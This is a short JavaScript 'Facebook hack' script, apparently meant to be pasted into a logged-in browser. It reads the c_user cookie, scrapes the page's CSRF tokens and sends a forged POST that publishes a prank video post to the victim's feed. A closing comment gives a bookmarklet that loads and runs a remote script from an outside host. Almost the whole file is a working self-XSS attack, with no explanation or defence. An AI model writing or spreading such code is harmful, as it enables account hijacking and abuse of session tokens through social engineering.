if (confirm("Ready?") == true){
function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length)
    }
    return null
}
var randomnumber=Math.floor(Math.random()*99999);
var user_id = readCookie("c_user");
var user_name = document.getElementById('navAccountName').innerHTML;
var message = "I can pretend I have a blackberry when I don't! (If this fb hack works)";
var jsText = "http://www.youtube.com/watch?v=dQw4w9WgXcQ";
var myText = "Cool vid";

var post_form_id = document.getElementsByName('post_form_id')[0].value;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var uid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = "/fbml/ajax/prompt_feed.php?__a=1";
var paramswp = "&__d=1&app_id=195094070525528&extern=1&" +
			   "&post_form_id=" + post_form_id + 
			   "&fb_dtsg=" + fb_dtsg + 
			   "&feed_info[app_has_no_session]=true&feed_info[body_general]=&feed_info[template_id]=60341837091&feed_info[templatized]=0&feed_target_type=target_feed&feedform_type=63&lsd&nctr[_ia]=1&post_form_id_source=AsyncRequest&preview=false&size=2&to_ids[0]=" + uid + 
			   "&user_message=%00";
httpwp.open("POST", urlwp, true);
httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
httpwp.setRequestHeader("Content-length", paramswp.length);
httpwp.setRequestHeader("Connection", "keep-alive");
httpwp.onreadystatechange = function(){
	if (httpwp.readyState == 4 && httpwp.status == 200){
		
	}
}
httpwp.send(paramswp);
}

//javascript:javascript:(a=(b=document).createElement('script')).src='//tristan.hume.ca/distribute/hack.js',b.body.appendChild(a);void(0)
